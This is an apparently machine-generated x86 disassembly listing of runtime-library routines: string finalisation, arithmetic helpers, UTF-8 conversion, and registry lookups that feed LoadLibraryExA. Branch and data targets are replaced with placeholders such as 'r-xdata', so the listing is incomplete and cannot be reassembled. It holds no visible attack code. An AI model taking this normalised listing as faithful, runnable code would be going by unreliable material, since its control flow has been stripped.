mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404884
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404854
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402838
sub_404924
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404970
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404970
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403f0c
jmp r-xdata
call sub_403ee8
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_4045e0
jmp r-xdata
call sub_4045c8
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404958
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404970
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404924
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405634
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_404f24
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402838
sub_404a80
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028d8
mov edx [ eax + esi ]
add eax ebx
call sub_403f3c
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404604
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404a68
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028d8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404b9c
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404a80
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_40564c
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_404f60
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402838
sub_404b9c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403f3c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404604
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404a68
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404b9c
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404a80
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40564c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_404f60
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402838
sub_404cbc
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404ce0
push ebp
push ebx
push esi
push edi
xor edi edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
or edx edx
jns r-xdata
or edx edx
je r-xdata
or ecx ecx
jns r-xdata
neg edx
neg eax
sbb edx 0x0
or edi 0x1
div ebx
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
mov ebp ecx
mov ecx 0x40
push edi
xor edi edi
xor esi esi
neg ecx
neg ebx
sbb ecx 0x0
xor edi 0x1
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
loop r-xdata
ja r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
pop ebx
test ebx 0x1
je r-xdata
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
sub_404d8c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404d84
jmp r-xdata
mov al 0x4
call sub_402838
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402838
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40271c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026dc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402b98
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404970
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028d8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402b98
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404d6c
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404d8c
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_404f24
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026fc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404970
sub_404f60
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_404f24
pop edx
pop eax
sub_404f88
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012dc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_404fb8
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40126c
mov eax esp
mov dl 0x1
call sub_4051f4
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_405000
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_404fb8
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_40503c
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401274
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40127c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405028
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405028
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405028
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_40124c
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_401244
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4051f4
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40126c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4052f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_40503c
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40128c
push eax
call sub_401264
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405474
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax [ ebx + 0x4 ]
call esi
test al al
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_40549c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404fb8
mov edx edi
call esi
test al al
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_4054f8
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026fc
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026fc
jmp r-xdata
sub_405558
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405593
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_4055c4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405628
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_405558
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40562f
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_40564c
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405678
test edx edx
je sub_405634
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402838
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_40571c
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_405744
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405820
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405958
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4059f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403ee8
mov eax ebx
xor edx edx
call sub_404740
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4059fe
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax ebx
call sub_404734
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_404534
mov eax ebx
call sub_404734
push eax
mov eax [ ebp - 0x4 ]
call sub_4041a8
inc eax
push eax
mov eax ebx
call sub_404724
push eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
pop ecx
pop edx
call sub_405744
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403ee8
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404534
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f3c
sub_405a04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405a9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4045c8
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405aa2
lea eax [ ebp - 0x4 ]
call sub_4045c8
retn
mov eax ebx
call sub_4041a8
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404810
mov eax ebx
call sub_4041a8
push eax
mov eax [ ebp - 0x4 ]
call sub_404734
inc eax
push eax
mov eax ebx
call sub_4043a8
push eax
mov eax [ ebp - 0x4 ]
call sub_404724
pop ecx
pop edx
call sub_405820
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_4045c8
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404810
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404604
sub_405aa8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405aeb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404714
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405958
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405af2
lea eax [ ebp - 0x4 ]
call sub_4045c8
retn
sub_405af8
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4040e0
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_405000
push eax
call sub_40129c
mov ecx eax
mov edx esp
mov eax esi
call sub_403fd8
jmp r-xdata
sub_405b50
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405bb6
push [ fs : edx ]
